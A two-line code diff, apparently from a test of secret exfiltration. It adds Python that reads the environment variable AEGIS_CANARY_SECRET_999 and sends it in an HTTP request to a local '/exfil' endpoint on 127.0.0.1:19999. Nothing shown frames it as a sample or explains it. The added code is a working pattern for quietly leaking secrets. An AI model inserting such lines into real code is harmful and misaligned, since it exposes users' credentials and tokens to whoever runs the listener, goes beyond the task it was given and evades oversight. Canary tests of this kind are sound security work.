@@ -1,0 +1,2 @@
+import os, urllib.request
+urllib.request.urlopen("http://127.0.0.1:19999/exfil?s=" + os.environ.get("AEGIS_CANARY_SECRET_999", ""))
